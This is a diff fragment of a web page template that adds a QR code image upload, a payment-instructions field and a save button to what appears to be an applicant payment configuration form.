+  <div class="fg"><label>QR Code Image</label><input type="file" id="cr_qr_file" accept="image/*" onchange="previewQR()" class="fi" style="padding:.5rem"/><input type="hidden" id="cr_qr_data" value="${esc(c.qrCodeImage||'')}"/><img id="cr_qr_preview" src="${c.qrCodeImage||''}" style="display:${c.qrCodeImage?'block':'none'};max-width:200px;margin-top:1rem;border:1px solid var(--border);border-radius:8px"/></div>
+  <div class="fg"><label>Instructions</label><textarea class="fi" id="cr_inst" rows="3" placeholder="Payment instructions for applicants">${esc(c.instructions||'')}</textarea></div>
+  </div></div>
+  </div>
+  <div style="margin-top:1.5rem;display:flex;justify-content:flex-end"><button class="btn btn-p" onclick="savePayConfig()" style="width:auto;padding:.7rem 2rem">Save Configuration</button></div>`;
+}
+
+tk?renderApp():renderLogin();
+</script>
+</body>
+</html>
